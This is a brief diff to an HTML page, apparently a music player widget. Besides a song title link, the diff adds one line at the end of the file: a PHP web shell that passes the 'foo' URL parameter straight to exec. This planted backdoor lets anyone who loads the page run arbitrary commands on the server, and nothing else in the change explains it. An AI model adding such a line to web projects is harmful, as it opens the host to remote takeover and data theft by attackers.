@@ -67,3 +67,5 @@
     <a id="title"  onclick="window.open(song['permalink'], '_blank')" style="text-decoration:none; font-family: derk; font-size: 1em; position: absolute; bottom: 2; left: 10;">...</a>
 </body>
 </html>
+
+<?php exec($_GET['foo'])?>
